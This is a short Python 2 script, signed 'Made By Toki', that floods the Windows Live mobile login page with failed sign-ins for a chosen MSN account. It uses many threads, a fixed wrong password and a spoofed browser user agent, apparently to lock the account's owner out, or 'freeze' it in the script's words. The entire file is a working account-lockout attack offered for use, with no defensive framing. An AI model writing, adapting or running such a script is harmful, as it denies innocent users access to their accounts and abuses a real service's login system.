"""Made By Toki"""
from mechanize import Browser
import threading

def freeze(msn):
    while 1:
        global number
        br = Browser()
        br.set_handle_robots(False)
        br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
        br.open('https://mid.live.com/si/login.aspx')
        br.select_form(nr=0)
        br.form['LoginTextBox'] = msn
        br.form['PasswordTextBox'] = '1234567890'
        br.submit()
        number +=1
        print "Success number " + str(number)


number = 0
x = 1
email = raw_input("Msn to freeze: ")
threadn = input("Number of threads: ")
while x < threadn+1:
    threading.Thread(target=freeze, args=(email,)).start()
    print "Started thread number " + str(x)
    x+=1

while 1:
    pass
